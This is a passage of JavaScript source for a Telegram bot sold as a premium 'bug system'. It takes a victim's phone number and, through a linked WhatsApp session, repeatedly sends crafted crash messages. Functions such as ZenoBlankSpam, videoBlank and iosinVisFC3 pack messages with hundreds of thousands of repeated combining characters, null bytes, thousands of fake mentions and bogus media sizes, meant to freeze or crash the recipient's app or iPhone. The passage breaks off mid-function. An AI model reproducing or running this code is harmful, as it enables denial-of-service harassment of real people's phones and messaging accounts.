    console.log(chalk.red(`Succes Standing Bugs [ 𖣂 Atlantic ⵢ Blood 𖣂 ]`));

    await bot.editMessageCaption(
      `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : overdrain              
│ Status  : Successfully Sending Bug             
│ Date    : ${date}             
├─────────────────────────┤
│「 ⓘ. Atlantic ☇ Blood .ᐟ 」
└─────────────────────────┘</pre></blockquote>
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,  // FIXED
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🥑 Проверить цели", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/destruIdo(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const db = loadDB();
  const date = getCurrentDate();
  const cooldown = checkCooldown(userId);

  // =============================
  // 1. FORMAT CHECK
  // =============================
  if (!match || !match[1] || !/^\d{8,}$/.test(match[1])) {
    return bot.sendMessage(chatId, `🪧 ☇ Format: /destruIdo 62×××`);
  }

  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // =============================
  // 2. IGNORE CHECK
  // =============================
  if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(chatId, "AOWKWOWK YATIM", { parse_mode: "HTML" });
  }

  // =============================
  // 3. PREMIUM CHECK
  // =============================
  if (!db.premiums.some(p => String(p.id) === String(userId))) {
    return bot.sendMessage(
      chatId,
      `<blockquote>「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ」</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🕊 Informasi", url: "https://t.me/AtlanticBlood" }]
          ]
        }
      }
    );
  }

  // =============================
  // 4. COOLDOWN CHECK
  // =============================
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Sabar ya, ${cooldown} detik sebelum mengirim lagi.`);
  }

  // =============================
  // 5. WA SESSION CHECK (FIXED QUOTE ERROR)
  // =============================
  if (sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu."
    );
  }

  // =============================
  // 6. OPSI GROUP ONLY
  // =============================
  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Helper delay random
  const randomSleep = (min, max) =>
    new Promise(resolve =>
      setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min)
    );

  // =============================
  // 7. SEND PESAN AWAL (randomImage → URL FIXED)
  // =============================
  const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bk5cbk.jpg", {
    caption: `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : destruIdo              
│ Status  : Proses             
│ Date    : ${date}             
├─────────────────────────┤
│「 ⓘ. Atlantic ☇ Blood .ᐟ 」
└─────────────────────────┘</pre></blockquote>
`,
    parse_mode: "HTML"
  });

  // SIMULASI EKSEKUSI
  try {
    for (let i = 0; i < 5; i++) {
      await NotifUI(target);
      await Xaramzy(target);
      await LocaXotion(target);
      await videoBlank(sock, target);
      await new Promise(r => setTimeout(r, Math.floor(Math.random()*500)+500));
    }

    await bot.editMessageCaption(
      `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : destruIdo              
│ Status  : Successfully Sending Bug             
│ Date    : ${date}             
├─────────────────────────┤
│「 ⓘ. Atlantic ☇ Blood .ᐟ 」
└─────────────────────────┘</pre></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/explosao(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const db = loadDB();
  const date = getCurrentDate();
  const cooldown = checkCooldown(userId);

  // =============================
  // 1. FORMAT CHECK
  // =============================
  if (!match || !match[1] || !/^\d{8,}$/.test(match[1])) {
    return bot.sendMessage(chatId, `🪧 ☇ Format: /explosao 62×××`);
  }

  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // =============================
  // 2. IGNORE CHECK
  // =============================
  if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(chatId, "AOWKWOWK YATIM", { parse_mode: "HTML" });
  }

  // =============================
  // 3. PREMIUM CHECK
  // =============================
  if (!db.premiums.some(p => String(p.id) === String(userId))) {
    return bot.sendMessage(
      chatId,
      `<blockquote>「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ」</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🕊 Informasi", url: "https://t.me/AtlanticBlood" }]
          ]
        }
      }
    );
  }

  // =============================
  // 4. COOLDOWN CHECK
  // =============================
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Sabar ya, ${cooldown} detik sebelum mengirim lagi.`);
  }

  // =============================
  // 5. WA SESSION CHECK (FIXED QUOTE ERROR)
  // =============================
  if (sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu."
    );
  }

  // =============================
  // 6. OPSI GROUP ONLY
  // =============================
  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Helper delay random
  const randomSleep = (min, max) =>
    new Promise(resolve =>
      setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min)
    );

  // =============================
  // 7. SEND PESAN AWAL (randomImage → URL FIXED)
  // =============================
  const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bk5cbk.jpg", {
    caption: `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : explosao              
│ Status  : Proses             
│ Date    : ${date}             
├─────────────────────────┤
│「 ⓘ. Atlantic ☇ Blood .ᐟ 」
└─────────────────────────┘</pre></blockquote>
`,
    parse_mode: "HTML"
  });

  // ================================
  // 8. PROSES BUG
  // ================================
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  try {
    for (let i = 0; i < 25; i++) {
      await ZenoBlankSpam(target);
      await videoBlank(sock, target);
      await Xaramzy(target);
      await LocationOtaxayun(sock, target);
      await sleep(Math.floor(Math.random() * (1500 - 500 + 1)) + 500);
    }

    console.log(chalk.red(`Succes Standing Bugs [ Atlantic ⵢ Blood ]`));

    // ================================
    // 9. UPDATE STATUS SUCCESS
    // ================================
    await bot.editMessageCaption(
      `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : explosao              
│ Status  : Successfully Sending Bug             
│ Date    : ${date}             
├─────────────────────────┤
│「 ⓘ. Atlantic ☇ Blood .ᐟ 」
└─────────────────────────┘</pre></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🥑 Проверить цели", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/apple(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const db = loadDB();
  const date = getCurrentDate();
  const cooldown = checkCooldown(userId);

  // =============================
  // 1. FORMAT CHECK
  // =============================
  if (!match || !match[1] || !/^\d{8,}$/.test(match[1])) {
    return bot.sendMessage(chatId, `🪧 ☇ Format: /apple 62×××`);
  }

  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // =============================
  // 2. IGNORE CHECK
  // =============================
  if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(chatId, "AOWKWOWK YATIM", { parse_mode: "HTML" });
  }

  // =============================
  // 3. PREMIUM CHECK
  // =============================
  if (!db.premiums.some(p => String(p.id) === String(userId))) {
    return bot.sendMessage(
      chatId,
      `<blockquote>「 🦠 𝐀𝐭𝐥𝐚𝐧𝐭𝐢𝐜 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 .ᐟ」</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🕊 Informasi", url: "https://t.me/AtlanticBlood" }]
          ]
        }
      }
    );
  }

  // =============================
  // 4. COOLDOWN CHECK
  // =============================
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Sabar ya, ${cooldown} detik sebelum mengirim lagi.`);
  }

  // =============================
  // 5. WA SESSION CHECK
  // =============================
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.");
  }

  // =============================
  // 6. GROUP ONLY CHECK
  // =============================
  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const randomSleep = (min, max) =>
    new Promise(resolve =>
      setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min)
    );

  // =============================
  // 7. SEND IMAGE + STATUS
  // =============================
  const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/bk5cbk.jpg", {
    caption: `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 Atlantic ☇ Bug System 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : apple              
│ Status  : Processing...             
│ Date    : ${date}             
├─────────────────────────┤
│「 Atlantic ☇ Blood 」
└─────────────────────────┘</pre></blockquote>
`,
    parse_mode: "HTML"
  });

  // ================================
  // PROSES BUG LOOP
  // ================================
  try {
    for (let i = 0; i < 5; i++) {
      await iosinVisFC3(sock, target);
      await randomSleep(500, 1500);
      await CrashThenPaymentSingleTry(target);
      await randomSleep(500, 1500);
      await LoadInvisIphone(sock, target);
      await randomSleep(500, 1500);
    }

    console.log(chalk.red(`Succes Standing Bugs [ Atlantic Blood ]`));

    // ================================
    // SUCCESS UPDATE
    // ================================
    await bot.editMessageCaption(
      `
<blockquote><pre>┌─────────────────────────┐
│「 🦠 Atlantic ☇ Bug System 」     
├─────────────────────────┤
│ Target  : ${formattedNumber}  
│ Command : apple              
│ Status  : SUCCESS ✔             
│ Date    : ${date}             
├─────────────────────────┤
│「 Atlantic ☇ Blood 」
└─────────────────────────┘</pre></blockquote>
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🥑 Проверить цели", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

//---------(Function)--------\\\

async function NotifUI(target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: " " },
            body: { text: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(20000),
                    id: "ok_btn"
                  })
                }
              ]
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function LocaXotion(target) {
    await sock.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 197-7728-82882,
                        degreesLongitude: -111-188839938,
                        caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 177,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1999@newsletter",
                                groupSubject: " Subject "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}

async function videoBlank(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/K4ezarIX",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function Xaramzy(target) {
  for (let i = 0; i < 50; i++) {

    const Tai = await generateWAMessageFromContent(
      target,
      {
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363399013145023@newsletter",
              newsletterName: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆",
              serverMessageId: 1
            }
          },
          header: {
            title: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆",
            hasMediaAttachment: true
          },
          nativeFlowMessage: {
            messageParamsJson: "{[".repeat(5000),
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "\n" + "\u0000".repeat(4500),
                  flow_message_version: "3"
                })
              },
              {
                name: "mpm",
                buttonParamsJson: JSON.stringify({ status: true })
              }
            ]
          }
        }
      }
    );

    await sock.relayMessage(target, Tai.message, {
      messageId: Tai.key.id,
      participant: { jid: target }
    });

  }
}

async function LocationOtaxayun(sock, target) {  
    console.log(chalk.red(`Atlantic Proses Standing Bugs To ${terget}`));  

    let AyunCantik = JSON.stringify({  
        status: true,  
        criador: "⋆｡°✩ ⋆｡°✩𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆",  
        resultado: {  
            type: "md",  
            ws: {  
                _events: {  
                    "CB:ib,,dirty": ["Array"]  
                },  
                _eventsCount: 80000,  
                _maxListeners: 0,  
                url: "wss://web.whatsapp.com/ws/chat",  
                config: {  
                    version: ["Array"],  
                    browser: ["Array"],  
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",  
                    sockCectTimeoutMs: 2000,  
                    keepAliveIntervalMs: 30000,  
                    logger: {},  
                    printQRInTerminal: false,  
                    emitOwnEvents: true,  
                    defaultQueryTimeoutMs: 6000,  
                    customUploadHosts: [],  
                    retryRequestDelayMs: 250,  
                    maxMsgRetryCount: 5,  
                    fireInitQueries: true,  
                    auth: { Object: "authData" },  
                    markOnlineOnsockCect: true,  
                    syncFullHistory: true,  
                    linkPreviewImageThumbnailWidth: 192,  
                    transactionOpts: { Object: "transactionOptsData" },  
                    generateHighQualityLinkPreview: false,  
                    options: {},  
                    appStateMacVerification: { Object: "appStateMacData" },  
                    mobile: true  
                }  
            }  
        }  
    });  

    
    const namaList = [
        "ꦾ".repeat(180000),
        "ꦾ".repeat(180000),
        "ꦽ".repeat(180000),
      "ꦽ".repeat(180000),
        "𑇂𑆵𑆴𑆿".repeat(60000),
        "𑇂𑆵𑆴𑆿".repeat(60000)
    ];  

    for (const nama of namaList) {  
        const generateLocationMessage = {  
            viewOnceMessage: {  
                message: {  
                    locationMessage: {  
                        degreesLatitude: -9999,  
                        degreesLongitude: 9999,  
                        name: nama,
                        address: AyunCantik,  
                        contextInfo: {  
                            mentionedJid: [  
                                target,  
                                ...Array.from({ length: 1945 }, () =>  
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                                )  
                            ],  
                            isSampled: true,  
                            participant: target,  
                            remoteJid: "status@broadcast",  
                            forwardingScore: 9741,  
                            isForwarded: true  
                        }  
                    }  
                }  
            }  
        };  

        const locationMsg = generateWAMessageFromContent(target, generateLocationMessage, {});  

        await sock.relayMessage(target, locationMsg.message, {  
            messageId: locationMsg.key.id,  
            participant: { jid: target },  
            userJid: target  
        });  

        await new Promise(r => setTimeout(r, 2000));
    }  
}

async function ZhTExtension(sock, target) {
    const ZhTxRizzMsg = await generateWAMessageFromContent(
        target,
        {
            extendedTextMessage: {
                text: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆" + "ꦽ".repeat(9999),
                matchedText: "https://Wa.me/stickerpack/Rizz",
                canonicalUrl: "https://Wa.me/stickerpack/Rizz",
                description: "⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑩𝒚𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆",
                contextInfo: {
                    mentionedJid: [
                        target,
                        ...Array.from({ length: 5 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                    ],
                    externalAdReply: {
                        title: "⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑩𝒚𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡",
                        body: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆",
                        thumbnailUrl: "https://Wa.me/stickerpack/Rizz",
                        mediaType: 1,
                        renderLargerThumbnail: false,
                        sourceUrl: "https://Wa.me/stickerpack/Rizz"
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(
        target,
        ZhTxRizzMsg.message,
        { messageId: ZhTxRizzMsg.key.id }
    );

    console.log(chalk.red(`[ATLANTIC] Proses Standing For close To ${target}`));
}

async function ZenoBlankSpam(target) {
  const ButtonsPush = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({  
        title: "ោ៝".repeat(2000),
        sections: [
          {
            title: "\u0000",
            rows: [],
          },
        ],
      }),
    },
  ];
  
  for (let i = 0; i < 100; i++) {
    ButtonsPush.push(
      {
        name: "galaxy_message",
        buttonParamsJson: "\u0000".repeat(1045000),
      },
    );
  }
  
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
              fileLength: "9999999999999",
              height: 9999,
              width: 9999,
              mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
              fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
              directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1755254367",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
            },
          },
          body: {
            text: "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: ButtonsPush,
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            ephemeralSettingTimestamp: 9741,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
            },
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/vibracoess",
                  unconsentedUsersUrl: "https://t.me/vibracoess",
                  consentedUsersUrl: "https://t.me/vibracoess",
                  cardIndex: 1,
                },
                {
                  originalUrl: "https://t.me/vibracoess",
                  unconsentedUsersUrl: "https://t.me/vibracoess",
                  consentedUsersUrl: "https://t.me/vibracoess",
                  cardIndex: 2,
                },
              ],
            },
          },
        },
      },
    },
  }, {});
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
    userJid: target,
  });
}

//

async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝑨𝒕‌𝒍𝒂𝒏‌𝒕𝒊𝒄 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/K4ezarIX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝑨𝒕‌𝒍𝒂𝒏‌𝒕𝒊𝒄 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝑨𝒕‌𝒍𝒂𝒏‌𝒕𝒊𝒄 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆" + TravaIphone, 
            matchedText: "𝕶4𝖊𝖟𝖆𝖗𝕴𝖃",
